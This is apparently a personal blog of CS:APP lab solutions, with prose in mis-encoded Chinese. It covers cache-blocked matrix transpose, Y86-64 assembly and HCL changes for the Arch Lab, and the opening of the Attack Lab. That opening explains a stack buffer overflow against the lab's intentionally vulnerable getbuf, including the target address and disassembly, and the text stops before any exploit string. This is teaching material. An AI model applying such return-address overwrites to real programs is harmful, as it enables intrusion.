    // cache å…±32ç»„ï¼Œæ¯ç»„1è¡Œï¼Œæ¯è¡Œ32byteï¼ˆ8ä¸ªintï¼‰
    int tmp;
    int bsize = 8; // å°å—çŸ©é˜µä¸º 8 * 8
    for (int i = 0; i &lt; N; i += bsize) {
        for (int j = 0; j &lt; M; j += bsize) {
            for (int bi = i; bi &lt; (i + bsize &lt; N ? i + bsize : N); ++bi) {
                for (int bj = j; bj &lt; (j + bsize &lt; M ? j + bsize : M); ++bj) {
                    B[bj][bi] = A[bi][bj];
                }
            }
        }
    }
}
</code></pre>
<p>ä½†æ˜¯è¿è¡Œ32*32å’Œ61*67éƒ½æ²¡æœ‰åˆ°è¾¾æ»¡åˆ†ï¼š</p>
<pre><code class="language-sh">å¯¹äº32 * 32çš„çŸ©é˜µ
sugar@ubuntuServer:~/csappLab/cachelab-handout$ ./test-trans -M 32 -N 32

Function 0 (2 total)
Step 1: Validating and generating memory traces
Step 2: Evaluating performance (s=5, E=1, b=5)
func 0 (Transpose submission): hits:1710, misses:343, evictions:311

sugar@ubuntuServer:~/csappLab/cachelab-handout$ ./test-trans -M 61 -N 67

Function 0 (2 total)
Step 1: Validating and generating memory traces
Step 2: Evaluating performance (s=5, E=1, b=5)
func 0 (Transpose submission): hits:6061, misses:2118, evictions:2086
</code></pre>
<p>åæ¥ä»”ç»†è§‚å¯ŸçŸ©é˜µè½¬ç½®çš„å†…å­˜åœ°å€è®¿é—®åºåˆ—å‘ç°ï¼Œè®¿é—®åœ°å€çš„å12ä½æŒ‡å®šäº†cacheçš„è®¿é—®ç»„å·å’Œæ ‡è®°ç­‰ä¿¡æ¯ï¼Œè€Œå12ä½çš„é«˜9ä½æŒ‡å®šäº†è®¿é—®çš„è¡Œå’Œåˆ—ã€‚</p>
<pre><code class="language-txt">S 0034a65c,4
 L 0030ac30,4
 S 0034a6dc,4
 L 0030ac34,4
 S 0034a75c,4
 L 0030ac38,4
 S 0034a7dc,4
 L 0030ac3c,4
 S 0034a85c,4
 L 0030a8c0,4
 S 0034a8c0,4
 L 0030a8c4,4
 S 0034a940,4
 L 0030a8c8,4
 S 0034a9c0,4
 L 0030a8cc,4
 S 0034aa40,4

å12ä½æŒ‡å®šäº†è®¿é—®çš„è¡Œåˆ—ä¿¡æ¯ï¼š
    åœ°å€ä½æ•°
    -----&gt;12 11&lt;------------&gt;2 1&lt;-&gt;0
    æ•°ç»„åŸºå€   row * 32 + col     in
</code></pre>
<p>æ‰€ä»¥è®¿é—®ä¸¤ä¸ªæ•°ç»„åŒè¡ŒåŒåˆ—çš„å…ƒç´ ä¸€å®šä¼šå¯¼è‡´cacheçš„misså’Œevictionï¼Œæ‰€ä»¥å¯¹å¯¹è§’çº¿å…ƒç´ ç‰¹æ®Šå¤„ç†</p>
<pre><code class="language-c">char transpose_submit_desc[] = &quot;Transpose submission&quot;;
void transpose_submit(int M, int N, int A[N][M], int B[M][N])
{
    // cache å…±32ç»„ï¼Œæ¯ç»„1è¡Œï¼Œæ¯è¡Œ32byteï¼ˆ8ä¸ªintï¼‰
    int tmp;
    int bsize = 8; // å°å—çŸ©é˜µä¸º 8 * 8
    for (int i = 0; i &lt; N; i += bsize) {
        for (int j = 0; j &lt; M; j += bsize) {
            for (int bi = i; bi &lt; (i + bsize &lt; N ? i + bsize : N); ++bi) {
                int index = 0;
                for (int bj = j; bj &lt; (j + bsize &lt; M ? j + bsize : M); ++bj) {
                    if (bi != bj) {
                        B[bj][bi] = A[bi][bj];
                    } else {
                        tmp = A[bi][bj];
                        index = bi;
                    }
                }
                // å®ŒæˆAçš„ä¸€è¡Œå…ƒç´ è½¬ç½®åï¼Œå†æŠŠå¯¹è§’çº¿ä¸Šçš„å…ƒç´ èµ‹ç»™Bï¼Œå¦åˆ™å…ˆè®¿é—®ä½äºåŒè¡Œåˆ—çš„Båï¼ŒæŠŠAçš„è¡Œç»™é©±é€
                if (i == j) {
                    B[index][index] = tmp;
                }
            }
        }
    }
}
</code></pre>
<p>å¯ä»¥å¯¹32*32çš„è¿ç®—missé™ä½åˆ°300ä»¥ä¸‹ï¼š</p>
<pre><code class="language-sh">sugar@ubuntuServer:~/csappLab/cachelab-handout$ ./test-trans -M 32 -N 32

Function 0 (2 total)
Step 1: Validating and generating memory traces
Step 2: Evaluating performance (s=5, E=1, b=5)
func 0 (Transpose submission): hits:1766, misses:287, evictions:255
</code></pre>
<p>ddfdå¯¹äºM=61ã€N=67çš„çŸ©é˜µï¼Œè¦æ±‚æ¯”è¾ƒå®½æ¾ï¼Œä½¿ç”¨16 * 16çš„å°çŸ©é˜µå³å¯ï¼š</p>
<pre><code class="language-c">if (M == 61 &amp;&amp; N == 67) {
    int i, j, k, l;
    for (i = 0; i &lt; N; i+=16)
    {
        for (j = 0; j &lt; M; j+=16)
        {
            for (k = i; k &lt; i + 16 &amp;&amp; k &lt; N; k++)
            {
                for (l = j; l &lt; j + 16 &amp;&amp; l &lt; M; l++)
                {
                    B[l][k] = A[k][l];
                }
            }
        }
    }
}
</code></pre>
<p>å¯¹äº64 * 64çš„çŸ©é˜µï¼Œç”±äºçŸ©é˜µçš„ä¸€è¡Œæœ‰64ä¸ªintï¼Œå¦‚æœè¿˜æ˜¯ä½¿ç”¨8*8çš„å°çŸ©é˜µï¼Œé‚£ä¹ˆå°çŸ©é˜µçš„ç¬¬0è¡Œå’Œç¬¬4è¡Œä¼šå­˜åœ¨åŒä¸€ä¸ªcacheç»„å†…ï¼ˆæ ¹æ®åœ°å€åˆ¤æ–­ï¼‰ï¼Œå¯¼è‡´å†²çªã€‚ä½¿ç”¨4 * 4çš„å°çŸ©é˜µä½œä¸ºæ›¿ä»£ï¼ˆ<a href="https://zhuanlan.zhihu.com/p/142942823">å‚è€ƒ</a>ï¼‰</p>
<pre><code class="language-c">if (M == 64 &amp;&amp; N == 64) {
    int i, j, k;
    int v0, v1, v2, v3;
    for (i = 0; i &lt; N; i+=4)
    {
        for (j = 0; j &lt; M; j+=4)
        {
            for (k = i; k &lt; i + 4; k++)
            {
                v0 = A[k][j];
                v1 = A[k][j+1];
                v2 = A[k][j+2];
                v3 = A[k][j+3];
                B[j][k] = v0;
                B[j+1][k] = v1;
                B[j+2][k] = v2;
                B[j+3][k] = v3;
            }
        }
    }
}
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="csapp---arch-lab"><a class="header" href="#csapp---arch-lab">CSAPP - Arch Lab</a></h1>
<p>Computer Systems A Programmer's Perspective ä¹¦ç±è¯¾ç¨‹é…å¥—<a href="http://csapp.cs.cmu.edu/3e/labs.html">å®éªŒ</a></p>
<p>å®éªŒå‰çš„å‡†å¤‡å·¥ä½œ</p>
<p>æŒ‰ç…§archlab.pdfæ–‡ä»¶ä¸­çš„æè¿°ï¼Œéœ€è¦åœ¨archlab-handout/simç›®å½•ä¸‹æ‰§è¡Œ <code>make clean; make</code> å‘½ä»¤ï¼Œä½†ä¼šå‡ºç°å·¥å…·ç¼ºå°‘ã€ç¼ºå°‘è¿è¡Œåº“çš„é—®é¢˜ï¼Œæ‰€ä»¥æ ¹æ®æç¤ºæ¥å®‰è£…å·¥å…·ï¼š</p>
<pre><code class="language-sh">$ sudo apt-get install bison flex
</code></pre>
<p>ç”±äºæˆ‘æ˜¯è¿æ¥æœåŠ¡å™¨æ¥åšå®éªŒçš„ï¼Œæ‰€ä»¥æ²¡æœ‰GUIï¼Œæ ¹æ®simç›®å½•ä¸‹çš„MakeFileæç¤ºï¼Œæ³¨é‡Šæ‰æœ‰å…³TCLã€tkçš„è¿è¡Œåº“ã€‚</p>
<pre><code class="language-makefile"># MakeFile
# Comment this out if you don't have Tcl/Tk on your system

# GUIMODE=-DHAS_GUI

# Modify the following line so that gcc can find the libtcl.so and
# libtk.so libraries on your system. You may need to use the -L option
# to tell gcc which directory to look in. Comment this out if you
# don't have Tcl/Tk.

# TKLIBS=-L/usr/lib -ltk -ltcl

# Modify the following line so that gcc can find the tcl.h and tk.h
# header files on your system. Comment this out if you don't have
# Tcl/Tk.

# TKINC=-isystem /usr/include/tcl8.5
</code></pre>
<h2 id="part-a"><a class="header" href="#part-a">Part A</a></h2>
<p>Aéƒ¨åˆ†ç”¨æ¥ç†Ÿæ‚‰Y86-64çš„æ±‡ç¼–ï¼Œç¼–å†™æ±‡ç¼–ç¨‹åºï¼Œå®ç°example.cä¸­å‡½æ•°çš„åŠŸèƒ½ã€‚ç¼–å†™å¥½***.ysç¨‹åºåï¼Œä½¿ç”¨yasæ±‡ç¼–æˆ***.yoï¼Œå†ä½¿ç”¨yisè¿è¡Œ***.yoæ–‡ä»¶ã€‚è¿˜è¦æ³¨æ„çš„ç‚¹æ˜¯ç¨‹åºæœ€åéƒ½è¦ç•™ä¸€è¡Œç©ºè¡Œ</p>
<h3 id="sum_listå‡½æ•°"><a class="header" href="#sum_listå‡½æ•°">sum_listå‡½æ•°</a></h3>
<p>æ¯”è¾ƒç®€å•ï¼Œç¨‹åºæ¡†æ¶å¯ä»¥çœ‹ä¹¦çš„P252çš„å†…å®¹ã€‚</p>
<pre><code class="language-asm">	.pos 0
	irmovq stack, %rsp
	call main
	halt

# Array of elements
.align 8
ele1:
	.quad 0x00a
	.quad ele2
ele2:
	.quad 0x0b0
	.quad ele3
ele3:
	.quad 0xc00
	.quad 0

main:
	irmovq ele1, %rdi  # get the begin address of array
	call sum_list
	ret

sum_list:
	irmovq $0, %rax
	irmovq $8, %r10  # bias
test:
	rrmovq %rdi, %r8
	andq %r8, %r8
	jne loop
	ret
loop:
	mrmovq (%rdi), %r9
	addq %r9, %rax
	addq %r10, %rdi
	mrmovq (%rdi), %rdi
	jmp test

# stack start here
	.pos 0x200
stack:
</code></pre>
<p>æ‰§è¡Œç»“æœ</p>
<pre><code class="language-sh">sugar@ubuntuServer:~/csappLab/archlab-handout/sim/misc$ ./yas sum.ys
sugar@ubuntuServer:~/csappLab/archlab-handout/sim/misc$ ./yis sum.yo
Stopped in 36 steps at PC = 0x13.  Status 'HLT', CC Z=1 S=0 O=0
Changes to registers:
%rax:	0x0000000000000000	0x0000000000000cba
%rsp:	0x0000000000000000	0x0000000000000200
%r9:	0x0000000000000000	0x0000000000000c00
%r10:	0x0000000000000000	0x0000000000000008

Changes to memory:
0x01f0:	0x0000000000000000	0x000000000000005b
0x01f8:	0x0000000000000000	0x0000000000000013
</code></pre>
<h3 id="rsum_listå‡½æ•°"><a class="header" href="#rsum_listå‡½æ•°">rsum_listå‡½æ•°</a></h3>
<p>ç”¨é€’å½’çš„æ–¹å¼å®ç°é“¾è¡¨æ±‚å’Œï¼Œæ³¨æ„è°ƒç”¨è€…ä¿å­˜çš„å‚æ•°å‹åˆ°æ ˆä¸Šã€‚</p>
<pre><code class="language-asm">	.pos 0
	irmovq stack, %rsp
	call main
	halt

# Array of elements
.align 8
ele1:
	.quad 0x00a
	.quad ele2
ele2:
	.quad 0x0b0
	.quad ele3
ele3:
	.quad 0xc00
	.quad 0

main:
	irmovq ele1, %rdi
	call rsum_list
	ret

rsum_list:
	rrmovq %rdi, %r8
	andq %r8, %r8
	jne recur
	irmovq $0, %rax
	ret
recur:
	pushq %r9
	mrmovq (%rdi), %r9
	mrmovq 8(%rdi), %rdi
	call rsum_list
	addq %r9, %rax
	popq %r9
	ret

	.pos 0x200
stack:
</code></pre>
<p>æµ‹è¯•</p>
<pre><code class="language-sh">sugar@ubuntuServer:~/csappLab/archlab-handout/sim/misc$ ./yas rsum.ys 
sugar@ubuntuServer:~/csappLab/archlab-handout/sim/misc$ ./yis rsum.yo
Stopped in 41 steps at PC = 0x13.  Status 'HLT', CC Z=0 S=0 O=0
Changes to registers:
%rax:	0x0000000000000000	0x0000000000000cba
%rsp:	0x0000000000000000	0x0000000000000200

Changes to memory:
0x01c0:	0x0000000000000000	0x0000000000000093
0x01c8:	0x0000000000000000	0x00000000000000b0
0x01d0:	0x0000000000000000	0x0000000000000093
0x01d8:	0x0000000000000000	0x000000000000000a
0x01e0:	0x0000000000000000	0x0000000000000093
0x01f0:	0x0000000000000000	0x000000000000005b
0x01f8:	0x0000000000000000	0x0000000000000013
</code></pre>
<h3 id="copyå‡½æ•°"><a class="header" href="#copyå‡½æ•°">copyå‡½æ•°</a></h3>
<p>ç±»ä¼¼memcpyï¼Œæˆ‘è¿™è¾¹çŠ¯äº†ä¸¤ä¸ªé”™è¯¯ï¼š</p>
<p>ç¬¬ä¸€ä¸ªå°±æ˜¯è¯»å–srcçš„åœ°å€æ—¶ç”¨æˆäº†mrmovq src, %rdiï¼Œæ­£ç¡®åº”è¯¥æ˜¯irmovq src, %rdiï¼›</p>
<p>å¦ä¸€ä¸ªæ˜¯åœ¨é€’å¢srcæŒ‡é’ˆï¼ˆä¿å­˜åœ¨%rdiä¸­ï¼‰æ—¶æˆ‘ç”¨äº†mrmovq 8(%rdi), %rdiï¼Œä½†æ˜¯è¿™ä¸ªæŒ‡ä»¤çš„è¯­ä¹‰æ˜¯ rdi = *(rdi + 8)ï¼Œæ­£ç¡®åº”è¯¥æ˜¯ç”¨ç«‹å³æ•°æ¥é€’å¢rdiï¼Œå‡è®¾$8å­˜åœ¨%r8ä¸­ï¼Œåˆ™é€’å¢æŒ‡é’ˆåº”è¯¥æ˜¯ addq %r8, %rdiã€‚</p>
<pre><code class="language-asm">	.pos 0
	irmovq stack, %rsp
	call main
	halt

# Source block
.align 8
src:
    .quad 0x00a
    .quad 0x0b0
    .quad 0xc00
# Destination block
dest:
    .quad 0x111
    .quad 0x222
    .quad 0x333

main:
	irmovq src, %rdi  # first parameter
	irmovq dest, %rsi  # seconde parameter
	irmovq $3, %rdx    # third parameter
	call copy_block
	ret

copy_block:
	irmovq $0, %rax
	irmovq $8, %r8
	irmovq $1, %r10
test:
	andq %rdx, %rdx
	jg loop
	ret
loop:
	mrmovq (%rdi), %r9  # get src val
	# mrmovq 8(%rdi), %rdi   # src++
	addq %r8, %rdi
	rmmovq %r9, (%rsi)  # *dest = val
	# mrmovq 8(%rsi), %rsi  # dest++
	addq %r8, %rsi
	xorq %r9, %rax  # result ^= val
	subq %r10, %rdx
	jmp test

	.pos 0x200
stack:
</code></pre>
<pre><code class="language-sh">sugar@ubuntuServer:~/csappLab/archlab-handout/sim/misc$ ./yas copy.ys
sugar@ubuntuServer:~/csappLab/archlab-handout/sim/misc$ ./yis copy.yo
Stopped in 41 steps at PC = 0x13.  Status 'HLT', CC Z=1 S=0 O=0
Changes to registers:
%rax:	0x0000000000000000	0x0000000000000cba
%rsp:	0x0000000000000000	0x0000000000000200
%rsi:	0x0000000000000000	0x0000000000000048
%rdi:	0x0000000000000000	0x0000000000000030
%r8:	0x0000000000000000	0x0000000000000008
%r9:	0x0000000000000000	0x0000000000000c00
%r10:	0x0000000000000000	0x0000000000000001

Changes to memory:
0x0030:	0x0000000000000111	0x000000000000000a
0x0038:	0x0000000000000222	0x00000000000000b0
0x0040:	0x0000000000000333	0x0000000000000c00
0x01f0:	0x0000000000000000	0x000000000000006f
0x01f8:	0x0000000000000000	0x0000000000000013
</code></pre>
<h3 id="partb"><a class="header" href="#partb">PartB</a></h3>
<p>ç»™Y86-64æŒ‡ä»¤é›†æ¶æ„å¢åŠ ä¸€æ¡iaddqçš„æŒ‡ä»¤ï¼ŒæŒ‡ä»¤æ ¼å¼å¯ä»¥å‚è€ƒä¹¦æœ¬P254ï¼ŒæŒ‡ä»¤å®ç°äº†å°†ä¸€ä¸ªå¸¸æ•°åŠ åˆ°å‡ ä¸ªå¯„å­˜å™¨ä¸Šã€‚å®éªŒä¸»è¦ä¿®æ”¹seq-full.hclæ–‡ä»¶ï¼Œä»¿ç…§ä¹¦ä¸Šçš„è¡¨æ ¼ï¼ˆä¸»è¦å‚è€ƒirmovqã€OPqä¸¤æ¡æŒ‡ä»¤çš„æ¯ä¸ªé˜¶æ®µå¤„ç†æµç¨‹ï¼‰å†™å‡ºiaddqçš„å¤„ç†æµç¨‹å°±å¯ä»¥äº†ã€‚</p>
<p>seq-full.hclå±•ç¤ºè¢«ä¿®æ”¹éƒ¨åˆ†çš„å†…å®¹ï¼š</p>
<pre><code class="language-txt">################ Fetch Stage     ###################################

# Determine instruction code
...
bool instr_valid = icode in 
	{ INOP, IHALT, IRRMOVQ, IIRMOVQ, IRMMOVQ, IMRMOVQ,
	       IOPQ, IJXX, ICALL, IRET, IPUSHQ, IPOPQ, IIADDQ};

# Does fetched instruction require a regid byte?
bool need_regids =
	icode in { IRRMOVQ, IOPQ, IPUSHQ, IPOPQ, 
		     IIRMOVQ, IRMMOVQ, IMRMOVQ, IIADDQ};

# Does fetched instruction require a constant word?
bool need_valC =
	icode in { IIRMOVQ, IRMMOVQ, IMRMOVQ, IJXX, ICALL, IIADDQ};
################ Decode Stage    ###################################
...
## What register should be used as the B source?
word srcB = [
	icode in { IOPQ, IRMMOVQ, IMRMOVQ, IIADDQ } : rB;
	icode in { IPUSHQ, IPOPQ, ICALL, IRET } : RRSP;
	1 : RNONE;  # Don't need register
];

## What register should be used as the E destination?
word dstE = [
	icode in { IRRMOVQ } &amp;&amp; Cnd : rB;
	icode in { IIRMOVQ, IOPQ, IIADDQ} : rB;
	icode in { IPUSHQ, IPOPQ, ICALL, IRET } : RRSP;
	1 : RNONE;  # Don't write any register
];

################ Execute Stage   ###################################

## Select input A to ALU
word aluA = [
	icode in { IRRMOVQ, IOPQ } : valA;
	icode in { IIRMOVQ, IRMMOVQ, IMRMOVQ, IIADDQ} : valC;
	icode in { ICALL, IPUSHQ } : -8;
	icode in { IRET, IPOPQ } : 8;
	# Other instructions don't need ALU
];

## Select input B to ALU
word aluB = [
	icode in { IRMMOVQ, IMRMOVQ, IOPQ, ICALL, 
		      IPUSHQ, IRET, IPOPQ, IIADDQ} : valB;
	icode in { IRRMOVQ, IIRMOVQ } : 0;
	# Other instructions don't need ALU
];
...
## Should the condition codes be updated?
bool set_cc = icode in { IOPQ, IIADDQ };
</code></pre>
<h2 id="partc"><a class="header" href="#partc">PartC</a></h2>
<p>è¿™ä¸ªéƒ¨åˆ†æ˜¯åœ¨æµæ°´çº¿æŒ‡ä»¤æ¶æ„çš„åŸºç¡€ä¸Šï¼Œå¯¹åŸºå‡†ç¨‹åºè¿›è¡Œä¼˜åŒ–ï¼Œå…¶å®å¯¹æµæ°´çº¿çš„ä½“ç³»ç»“æ„æ²¡æœ‰å¤ªå¤šçš„è®¾è®¡ï¼ˆä¸»è¦å°±æ˜¯å®ç°iaddqæŒ‡ä»¤ï¼Œç±»ä¼¼partBï¼Œè¿™é‡Œå°±ä¸è¯´äº†ï¼‰</p>
<p>ä¸€äº›æŠ˜è…¾ï¼šæˆ‘æœ¬æ¥æ˜¯åœ¨linuxæœåŠ¡å™¨ä¸Šè·‘è¿™ä¸ªå®éªŒçš„ï¼Œä½†æ˜¯æŸæ¬¡æˆ‘æ— æ„ä¸­åœ¨æˆ‘æœ¬æœºï¼ˆOSXï¼‰ä¸Šmakeäº†ä»¥ä¸‹ï¼Œå‘ç°åªæœ‰ä¸€ä¸ªæŠ¥é”™ï¼š/usr/bin/ld: cannot find -lfl åŸæ¥æ˜¯ç¼–è¯‘ç”Ÿæˆyasæ—¶éœ€è¦flexçš„åŠ¨æ€é“¾æ¥åº“ï¼Œä½†macç³»ç»Ÿé‡Œè‡ªå¸¦äº†flexçš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œæˆ‘è¿˜æ²¡æœ‰æ‰¾åˆ°å¯¹åº”çš„åº“ï¼Œäºæ˜¯æˆ‘åˆç”¨brewå¦å¤–å®‰è£…äº†ä¸€ä¸ªflexï¼š</p>
<pre><code class="language-txt">==&gt; flex
flex is keg-only, which means it was not symlinked into /usr/local,
because macOS already provides this software and installing another version in
parallel can cause all kinds of trouble.

If you need to have flex first in your PATH, run:
  echo 'export PATH=&quot;/usr/local/opt/flex/bin:$PATH&quot;' &gt;&gt; ~/.zshrc

For compilers to find flex you may need to set:
  export LDFLAGS=&quot;-L/usr/local/opt/flex/lib&quot;
  export CPPFLAGS=&quot;-I/usr/local/opt/flex/include&quot;
</code></pre>
<p>ä¹‹åä¿®æ”¹/sim/misc/makefileçš„LEXLIBä¸ºï¼š<code>LEXLIB = -L/usr/local/opt/flex/lib -lfl</code></p>
<p>å°±å¯ä»¥æ­£å¸¸ç¼–è¯‘äº†ã€‚</p>
<p>å¦‚ä½•éªŒè¯PartCçš„ç­”æ¡ˆï¼š</p>
<p>1ã€é¦–å…ˆæ˜¯ncopy.ysçš„æ­£ç¡®ï¼ˆdriverçš„åŸç†å°±æ˜¯ç»™æ•°æ®æ®µçš„srcèµ‹å€¼ï¼Œå› ä¸ºncopy.ysçš„å†…å®¹é‡Œé¢æ²¡æœ‰æŒ‡å®šsrcçš„å†…å®¹</p>
<pre><code class="language-sh">unix&gt; make drivers  
unix&gt; ../misc/yis sdriver.yo  
unix&gt; ../misc/yis ldriver.yoÂ Â  Â   
</code></pre>
<p>%raxçš„ç»“æœæ˜¯2ï¼Œé‚£ä¹ˆå°±è¯´æ˜ä½ çš„y86æ±‡ç¼–å†™çš„æ²¡é—®é¢˜</p>
<p>2ã€æµ‹è¯•è¿™æ®µysæ±‡ç¼–åœ¨æµæ°´çº¿æŒ‡ä»¤é›†æ¶æ„ä¸Šçš„è¿è¡Œ</p>
<pre><code class="language-sh">make psim VERSION=full  
./psim -t sdriver.yo  
./psim -t ldriver.yo
</code></pre>
<p>ç”±äºsdriverå’Œldriveréƒ½æ˜¯å›ºå®šçš„å…ƒç´ æ•°é‡,å¯ä»¥ç”¨perlè„šæœ¬correntness.plæ¥ç”Ÿæˆä¸åŒå…ƒç´ æ•°é‡çš„srcçš„driverï¼Œç›¸å½“äºä¸åœçš„è°ƒç”¨ <code>./gen-driver.pl -f ncopy.ys -n K -rc &gt; driver.ys</code> æ¥æµ‹è¯•</p>
<p>3ã€æµ‹è¯• æµæ°´çº¿æ–°å¢æŒ‡ä»¤å æ˜¯å¦å½±å“äº†åŸæ¥çš„æŒ‡ä»¤é›† ï¼ˆç„¶åæ˜¯pipe-full.hclçš„æµæ°´çº¿æ¶æ„çš„Y86æŒ‡ä»¤é›†çš„æ­£ç¡®æ€§ï¼‰</p>
<pre><code>unix&gt; (cd ../ptest; make SIM=../pipe/psim TFLAGS=-i)
</code></pre>
<p>4ã€åœ¨æ–°å¢äº†æŒ‡ä»¤åçš„æµæ°´çº¿ä¸Šæµ‹è¯•ncopyçš„ä»£ç </p>
<pre><code>unix&gt; ./correctness.pl -p
</code></pre>
<p>5ã€æœ€åçš„è¯„åˆ†ç”¨benchmark.plæ¥è¯„å®šï¼Œç”¨ä½ çš„æµæ°´çº¿æ¶æ„è·‘ncopy.ysç¨‹åºçš„CPEã€‚</p>
<p>è¿™è¾¹æˆ‘ç”¨2 * 1å±•å¼€å¾ªç¯ï¼Œä½œä¸ºä¼˜åŒ–ncopy.ys</p>
<pre><code class="language-txt"># You can modify this portion
	# Loop header
	xorq %rax,%rax		# count = 0;
	andq %rdx,%rdx		# len &lt;= 0?
	jle Done		# if so, goto Done:
	iaddq $-1, %rdx     # limit = len - 1
	je Only
Loop:	
	mrmovq (%rdi), %r10	# read val from src...
	mrmovq 8(%rdi), %r9
	andq %r10, %r10		# val &lt;= 0?
	jle Npos1
	iaddq $1, %rax
Npos1:
	rmmovq %r10, (%rsi)	# ...and store it to dst
	andq %r9, %r9		# val &lt;= 0?
	jle Npos		# if so, goto Npos:
	iaddq $1, %rax		# count++
Npos:	
	rmmovq %r9, 8(%rsi)  # *(dest+1) = *(src+1)
	iaddq $-2, %rdx    # limit -= 2
	iaddq $16, %rdi		# src += 2
	iaddq $16, %rsi		# dst += 2
	andq %rdx,%rdx		# limit &gt; 0?
	jg Loop			# if so, goto Loop:
	jl Done
Only:
	mrmovq (%rdi), %r10  # remain one
	andq %r10, %r10
	jle Npos2
	iaddq $1, %rax
Npos2:
	rmmovq %r10, (%rsi)
Done:
	ret
</code></pre>
<p>ç”¨driveræµ‹è¯•è¿™æ®µä»£ç çš„æ­£ç¡®æ€§ï¼š</p>
<pre><code class="language-txt">âœ  pipe git:(master) âœ— make drivers
./gen-driver.pl -n 4 -f ncopy.ys &gt; sdriver.ys
../misc/yas sdriver.ys
./gen-driver.pl -n 63 -f ncopy.ys &gt; ldriver.ys
../misc/yas ldriver.ys
âœ  pipe git:(master) âœ— ../misc/yis sdriver.yo
Stopped in 40 steps at PC = 0x31.  Status 'HLT', CC Z=0 S=1 O=0
Changes to registers:
%rax:	0x0000000000000000	0x0000000000000002
%rdx:	0x0000000000000000	0xffffffffffffffff
%rsp:	0x0000000000000000	0x00000000000001d0
%rsi:	0x0000000000000000	0x0000000000000148
%rdi:	0x0000000000000000	0x0000000000000118
%r9:	0x0000000000000000	0x0000000000000004
%r10:	0x0000000000000000	0x0000000000000003

Changes to memory:
0x0128:	0x0000000000cdefab	0xffffffffffffffff
0x0130:	0x0000000000cdefab	0xfffffffffffffffe
0x0138:	0x0000000000cdefab	0x0000000000000003
0x0140:	0x0000000000cdefab	0x0000000000000004
0x01c8:	0x0000000000000000	0x0000000000000031
âœ  pipe git:(master) âœ— ../misc/yis ldriver.yo   
Stopped in 450 steps at PC = 0x31.  Status 'HLT', CC Z=0 S=0 O=0
Changes to registers:
%rax:	0x0000000000000000	0x000000000000001f
%rsp:	0x0000000000000000	0x0000000000000588
%rsi:	0x0000000000000000	0x00000000000004f8
%rdi:	0x0000000000000000	0x00000000000002e8
%r9:	0x0000000000000000	0x000000000000003e
%r10:	0x0000000000000000	0x000000000000003f

Changes to memory:
0x0308:	0x0000000000cdefab	0xffffffffffffffff
0x0310:	0x0000000000cdefab	0x0000000000000002
...
âœ  pipe git:(master) âœ— ./correctness.pl 
Simulating with instruction set simulator yis
	ncopy
0	OK
1	OK
2	OK
3	OK
...
256	OK
68/68 pass correctness test
</code></pre>
<p>åœ¨pipe-full.hclä¸­å®ç°iaddqæŒ‡ä»¤åï¼Œæµ‹è¯•å®ç°çš„æ­£ç¡®æ€§</p>
<pre><code class="language-sh">$ make psim VERSION=full  
$ ./psim -t sdriver.yo 
$ ./psim -t ldriver.yo
$ (cd ../y86-code; make testpsim) 
$ (cd ../ptest; make SIM=../pipe/psim TFLAGS=-i)
$ ./correctness.pl -p     
éƒ½é€šè¿‡åï¼Œä½¿ç”¨benchmark.plè¿›è¡Œæµ‹è¯•
å¾—åˆ†20/60
Average CPE	9.48
Score	20.4/60.0
</code></pre>
<p>å¾—åˆ†20ğŸ˜…ï¼Œè®©æˆ‘å»ç½‘ä¸Šçœ‹çœ‹å¤§ä½¬ä»¬éƒ½æ€ä¹ˆæçš„</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="csapp---attack-lab"><a class="header" href="#csapp---attack-lab">CSAPP - Attack Lab</a></h1>
<h2 id="ctarget-level-1"><a class="header" href="#ctarget-level-1">CTarget level 1</a></h2>
<p>æ ¹æ®<a href="http://csapp.cs.cmu.edu/3e/attacklab.pdf">writeup</a>ä¸­çš„æç¤ºï¼Œç”¨code-injectionçš„æ–¹æ³•ä½¿åŸç¨‹åºæ‰§è¡Œæƒ³è¦çš„å‡½æ•°ï¼ˆtouch1ï¼‰ï¼Œä¸»è¦ç”¨åˆ°çš„çŸ¥è¯†åœ¨ä¹¦ä¸­çš„ç¬¬ä¸‰ç« çš„å†…å­˜è¶Šç•Œå’Œç¼“å†²åŒºæº¢å‡ºç« èŠ‚å¯ä»¥çœ‹åˆ°ã€‚éœ€è¦ä½¿ç”¨objdumpåæ±‡ç¼–å¯æ‰§è¡Œæ–‡ä»¶ï¼Œæ‰¾åˆ°ç›®æ ‡å‡½æ•°touch1çš„å…¥å£åœ°å€ä¸º0x4017c0ã€‚æ”»å‡»çš„åŸç†æ˜¯ï¼Œç¨‹åºè¿è¡Œæ—¶ä¼šè°ƒç”¨Getsä»æ ‡å‡†è¾“å…¥è¯»å…¥å­—ç¬¦ä¸²ï¼Œä½†æ˜¯Getså‡½æ•°çš„å®ç°æ˜¯ä¸å®‰å…¨çš„ï¼Œæ²¡æœ‰è¿›è¡Œè¾¹ç•Œæ£€æŸ¥ï¼Œè¯»å…¥çš„å­—ç¬¦ä¸²å¯èƒ½ä¼šè¶…è¿‡ç¼“å†²åŒºçš„å¤§å°ã€‚</p>
<pre><code class="language-c">unsigned getbuf() {
    char buf[BUFFER_SIZE];
    Gets(buf);
    return 1;
}
</code></pre>
<p>æ‰€ä»¥ï¼Œè®©Getså‡½æ•°è¯»å…¥è¶…è¿‡åœ¨æ ˆä¸Šåˆ†é…çš„ç©ºé—´å¤§å°çš„å­—ç¬¦ä¸²ï¼ŒåŒæ—¶è¦†ç›–æ ˆå¸§ä¸Šçš„è¿”å›åœ°å€ï¼ˆ8å­—èŠ‚ï¼‰ï¼Œå¯ä»¥ä½¿å¾—getbufåœ¨è¿”å›çš„æ—¶å€™ï¼ŒretæŒ‡ä»¤è¯»å–$rspæŒ‡å‘çš„æ ˆä¸Šçš„å†…å®¹æ˜¯æˆ‘ä»¬æƒ³è¦çš„touch1å‡½æ•°å…¥å£åœ°å€ã€‚ç”±äºBUFFER_SIZEæ˜¯ç¼–è¯‘é˜¶æ®µç¡®å®šçš„å¸¸é‡ï¼Œéœ€è¦ä»æ±‡ç¼–ä»£ç ä¸­ç¡®å®šç¼“å†²åŒºçš„å¤§å°ã€‚</p>
<pre><code class="language-x86asm">00000000004017a8 &lt;getbuf&gt;:
  4017a8:    48 83 ec 28              sub    $0x28,%rsp
  4017ac:    48 89 e7                 mov    %rsp,%rdi
  4017af:    e8 8c 02 00 00           callq  401a40 &lt;Gets&gt;
  4017b4:    b8 01 00 00 00           mov    $0x1,%eax
  4017b9:    48 83 c4 28              add    $0x28,%rsp
